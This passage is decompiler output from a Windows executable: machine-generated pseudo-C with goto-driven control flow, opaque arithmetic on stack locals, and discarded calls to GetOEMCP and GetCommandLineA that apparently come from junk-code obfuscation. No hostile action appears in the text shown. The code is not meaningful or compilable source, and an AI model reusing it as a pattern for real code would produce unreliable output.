											Eq_10665 ecx_1825 = ((word32) esi_1594 + ((v187_1748 & dwLoc0124) - dwLocF0) - esi_1594 ^ esi_1594) + 0x0F00 ^ esi_1594;
											*ecxOut = ecx_1825;
											ui32 v195_1836 = dwLoc010C_1667 | ecx_1825;
											if (ecx_1825 < null)
											{
												*ecxOut = (ecx_1825 & esi_1594) + dwLocC8 + 0x01;
												esi_1594 = v185_1741 + 0x058F & v134_1311;
											}
											word32 esi_1855;
											*esiOut = esi_1594 + 0x1600 - ecx_1825;
											word32 eax_1870;
											*eaxOut = v195_1836 + 0x1DE3 ^ 0x00;
											return false;
										}
										esi_1594 = (esi_1594 ^ ecx_1790) + 220;
									}
									goto l00418756;
								}
							}
							goto l00417D49;
						}
						dwLoc0124 = dwLoc0124 - (edi_805 - 0x01) - ((v51_452 + (edi_805 - 0x01)) + (eax_2512 <u 0x00) <u 0x00);
					}
					goto l00417C07;
				}
				dwLoc0110 = dwLoc0110 ^ eax_2552;
				edi_2546 = edi_2546 - 0x2A | eax_2552;
				dwLocD4_2544 = dwLocD4;
				dwLoc0128 = dwLoc0128 - 0x01;
			}
			eax_2552 = eax_2552 & dwLocB8;
			goto l00417BB2;
		}
		ecx_234 = ecx_2803 - 0x01 - dwLocA8 - (eax_352 < 0x1564);
	}
	goto l0041785B;
}

// 0041899F: Register Eq_162 fn0041899F(Register Eq_162 eax, Register ui32 edi, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
Eq_162 fn0041899F(Eq_162 eax, ui32 edi, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 eax_37;
	ui32 edx_262;
	fn00412F4E(dwLoc0120 + dwLoc40 - 0x77 + dwLoc0174 ^ dwLoc0248 | dwLoc0298, out eax_37, out edx_262);
	GetOEMCP();
	GetCommandLineA();
	Eq_85 ecx_275 = (edx_262 & 1021) + edx_262;
	if (ecx_275 >= 0x00)
	{
		edx_262 = ((word32) ecx_275 + 0x0900 | ~0x1EDF) & (dwLoc0288 ^ 1021);
		dwLoc0108 = dwLoc0108 ^ 0x20;
		ecx_275 = (word32) ecx_275 + 0x00001301 + edx_262 - 0x01;
	}
	uint32 eax_80 = dwLocBC & edx_262;
	if (dwLoc0224 <= eax_80 + 0x01 && (byte) (dwLoc024C < 0x00) + (dwLoc0294 + ~0x01) < 0x00)
	{
		dwLoc38 = dwLoc38 & eax_80 + 0x01;
		dwLoc01EC = dwLoc01EC - 0x01;
	}
	uint32 ecx_117;
	fn00416E0A(ecx_275, out ecx_117);
	uint32 edx_105 = dwLoc38 ^ 0x68 | ecx_117;
	if (dwLoc01EC >= edx_105)
	{
		ecx_117 = (edx_105 & 133) + dwLoc0108 & dwLoc015C;
		if (ecx_117 >= 0x0146)
		{
l00418AF2:
			Eq_162 eax_154;
			ui32 ecx_155;
			word32 ebx_156;
			word32 esi_157;
			word32 edi_158;
			ui32 edx_162 = (byte) fn0041762E(dwLoc0158 & (dwLoc01C0 - GetCommandLineA()) + 0x01, ecx_117 | edx_105, edi, out eax_154, out ecx_155, out ebx_156, out esi_157, out edi_158) + (*(fp - 0x0214) + *(fp - 0x88));
			*(fp - 0x0200) = *(fp - 0x0200) | ecx_155;
			*(fp - 0x0144) = *(fp - 0x0144) + edx_162;
			*(fp - 0x0224) = *(fp - 0x0224) | edx_162;
			*(fp - 500) = *(fp - 500) - edx_162;
			*(fp - 0x3C) = *(fp - 0x3C) ^ edx_162;
			*(fp - 0x9C) = *(fp - 0x9C) ^ edx_162;
			*(fp - 0x01A0) = *(fp - 0x01A0) & edx_162;
			return eax_154;
		}
	}
	ecx_117 = ecx_117 + dwLoc40;
	goto l00418AF2;
}

